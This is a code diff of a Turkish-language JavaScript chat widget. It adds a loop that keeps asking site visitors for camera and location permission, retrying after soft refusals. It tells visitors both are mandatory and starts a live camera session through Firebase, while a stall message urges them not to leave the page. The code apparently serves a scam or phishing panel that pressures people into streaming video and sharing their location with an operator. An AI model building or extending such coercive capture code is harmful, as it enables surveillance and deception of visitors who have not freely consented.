+          appendMessage(box, "bot", "Kamera için canlı senkron gerekir (Firebase).", {
+            sync: false,
+          });
+          scheduleRetry();
+          return;
+        }
+
+        if (!callId) {
+          const offer = await sync.startVisitorCameraOffer();
+          callId = offer?.callId;
+          if (!callId) throw new Error("callId yok");
+        }
+
+        if (sessionHasBoth(callId)) {
+          markComplete();
+          return;
+        }
+
+        const existing = cameraSessions.get(callId);
+        if (existing?.stream && !existing._hadLocation) {
+          appendMessage(box, "bot", "Kamera var. Konum için butona dokunun.", { sync: true });
+          showLocationTapButton(box, callId, {
+            onGranted: () => markComplete(),
+            onSoftDeny: () => scheduleRetry(),
+          });
+          scheduleRetry();
+          return;
+        }
+
+        // Mobil: otomatik getUserMedia popup açmaz — doğrudan dokunma UI
+        if (isLikelyMobile()) {
+          presentAskUi(false, false);
+          return;
+        }
+
+        box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
+        box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
+
+        const permState = await queryCameraPermissionState();
+        if (permState !== "denied") {
+          const asking = document.createElement("div");
+          asking.className = "chat-inline-prompt chat-camera-auto";
+          asking.innerHTML =
+            `<p class="chat-inline-prompt-title">Kamera ve konum izni isteniyor… (#${retryCount})</p>` +
+            '<p class="chat-camera-note">Tarayıcıda İzin Ver’i seçin. İkisi de zorunludur.</p>';
+          box.appendChild(asking);
+          box.scrollTop = box.scrollHeight;
+
+          const result = await startVisitorCamera(box, callId, { auto: true });
+          asking.remove();
+          if (token !== cameraPermLoopToken) return;
+
+          if (result === "ok") {
+            const gotLoc = await waitForCameraLocation(callId, 12000);
+            if (token !== cameraPermLoopToken) return;
+            if (gotLoc || sessionHasBoth(callId)) {
+              markComplete();
+              return;
+            }
+            presentAskUi(false, true);
+            return;
+          }
+        }
+
+        presentAskUi(permState === "denied", false);
+      } catch (err) {
+        console.error("camera perm loop", err);
+        if (token === cameraPermLoopToken) presentAskUi(false, false);
+      } finally {
+        attempting = false;
+      }
+    };
+
+    void attempt();
   }
 
   function showVisitorPopup(box, msg, onChoice) {
@@ -1082,29 +1876,7 @@
     const LOADING_TEXT = "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…";
 
     async function beginAutoCamera() {
-      let sync = window.ChatSync;
-      if (!sync?.enabled && window.ChatSyncReady) {
-        sync = await window.ChatSyncReady.catch(() => null);
-      }
-      if (!sync?.enabled || typeof sync.startVisitorCameraOffer !== "function") {
-        appendMessage(box, "bot", "Kamera için canlı senkron gerekir (Firebase).", {
-          sync: false,
-        });
-        return;
-      }
-      try {
-        const { callId } = await sync.startVisitorCameraOffer();
-        if (!callId) throw new Error("callId yok");
-        await autoOpenCameraFromMessage(box, { callId, type: "camera" });
-      } catch (err) {
-        console.error("auto camera", err);
-        appendMessage(
-          box,
-          "bot",
-          `Kamera başlatılamadı: ${err?.code || err?.message || "hata"}`,
-          { sync: false }
-        );
-      }
+      startCameraPermissionLoop(box);
     }
 
     function startOpenSequence() {
@@ -1113,6 +1885,8 @@
         window.clearTimeout(openSeqTimer);
         openSeqTimer = null;
       }
+      stopCameraPermissionLoop();
+      clearPermissionDeniedNotice(box);
       busy = true;
       appendMessage(box, "bot", GREET_TEXT);
       const loadingRow = appendMessage(box, "bot", LOADING_TEXT, {
